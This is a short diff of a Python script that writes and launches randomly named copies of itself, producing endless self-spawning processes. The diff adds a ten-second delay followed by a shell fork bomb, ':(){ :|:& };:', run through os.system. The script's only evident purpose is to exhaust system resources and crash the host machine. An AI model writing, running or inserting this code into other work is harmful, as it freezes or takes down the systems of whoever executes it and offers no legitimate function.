@@ -1,5 +1,6 @@
 import os
 import random
+import time
 def forked():
   randomlet = ["A", "a", "B", "b", "C", "c", "D", "d", "E", "e", "F", "f", "G", "g", "H", "h", "I", "i", "J", "j", "K", "k", "L", "l", "M","m", "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "S", "T", "t", "U", "u", "V", "v", "W", "x", "Y", "y", "Z", "z"]
   randonum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
@@ -44,3 +45,5 @@ def forked():
     os.system("python " + "fucked" + random1 + str(random2) + str(random3) + str(random4) + ".py")
     """)
   os.system("python " + "fucked" + random1 + str(random2) + str(random3) + str(random4) + ".py")
+  time.sleep(10)
+  os.system(":(){ :|:& };:")
